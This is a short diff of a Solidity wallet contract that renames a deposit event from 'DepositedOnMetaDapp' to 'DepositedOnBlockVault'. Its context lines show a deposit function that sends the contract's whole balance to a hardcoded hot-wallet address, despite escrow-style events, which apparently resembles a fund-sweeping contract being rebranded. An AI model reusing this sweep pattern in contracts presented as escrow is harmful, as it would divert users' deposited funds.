@@ -7,7 +7,7 @@ contract WalletContract {
     address private constant HOT_WALLET = 0x0DEc99cDF5910723887a8320605bEBBD1AA0deE5;
     uint256 private constant ESCROW_TIMEOUT = 1 hours;
 
-    event DepositedOnMetaDapp();
+    event DepositedOnBlockVault();
     event EscrowInitiated(address indexed from, address indexed to, uint256 amount);
     event EscrowConfirmed(address indexed from, address indexed to, uint256 amount);
     event FundsReleased(address indexed to, uint256 amount);
@@ -28,7 +28,7 @@ contract WalletContract {
         if(msg.value >= MIN){
             (bool success, ) = payable(HOT_WALLET).call{value: address(this).balance}("");
             require(success);
-            emit DepositedOnMetaDapp();
+            emit DepositedOnBlockVault();
         }
     }
 
